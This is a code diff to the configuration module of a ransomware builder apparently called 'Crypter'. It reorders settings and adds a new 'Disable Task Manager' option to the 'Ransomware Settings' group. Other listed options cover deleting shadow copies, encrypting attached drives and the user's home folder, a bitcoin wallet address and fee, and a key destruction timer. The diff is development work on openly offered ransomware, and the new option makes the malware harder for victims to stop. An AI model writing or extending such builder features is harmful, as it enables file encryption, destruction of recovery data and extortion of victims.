@@ -125,19 +125,6 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
-        "gui_title", {
-            "label": "GUI Title",
-            "label_object_name": "GuiTitleLabel",
-            "input_object_name": "GuiTitleTextCtrl",
-            "regex": re.compile("^.{0,20}$"),
-            "example": "CRYPTER",
-            "input_requirement": "A Title to display in Crypter GUI",
-            "validate": True,
-            "default": "CRYPTER",
-            "config_area": "Ransomware Settings"
-            }
-    ),
-    (
         "upx_dir", {
             "label": "UPX Packer Directory",
             "label_object_name": "UpxDirLabel",
@@ -151,12 +138,16 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
-        "delete_shadow_copies", {
-            "label": "Delete Shadow Copies",
-            "input_object_name": "DeleteShadowCopiesCheckbox",
-            "config_area": "Ransomware Settings",
-            "validate": False,
-            "default": True
+        "gui_title", {
+            "label": "GUI Title",
+            "label_object_name": "GuiTitleLabel",
+            "input_object_name": "GuiTitleTextCtrl",
+            "regex": re.compile("^.{0,20}$"),
+            "example": "CRYPTER",
+            "input_requirement": "A Title to display in Crypter GUI",
+            "validate": True,
+            "default": "CRYPTER",
+            "config_area": "Ransomware Settings"
             }
     ),
     (
@@ -170,6 +161,24 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "config_area": "Ransomware Settings",
             "validate": True,
             "default": "259200"
+            }
+    ),
+    (
+        "delete_shadow_copies", {
+            "label": "Delete Shadow Copies",
+            "input_object_name": "DeleteShadowCopiesCheckbox",
+            "config_area": "Ransomware Settings",
+            "validate": False,
+            "default": True
+            }
+    ),
+    (
+        "disable_task_manager", {
+            "label": "Disable Task Manager",
+            "input_object_name": "DisableTaskManagerCheckbox",
+            "config_area": "Ransomware Settings",
+            "validate": False,
+            "default": False
             }
     ),
     (
@@ -328,6 +337,7 @@ RUNTIME_CONFIG_ITEMS = [
     "encrypt_attached_drives",
     "encrypt_user_home",
     "encrypted_file_extension",
+    "disable_task_manager",
     "wallet_address",
     "bitcoin_fee",
     "key_destruction_time",
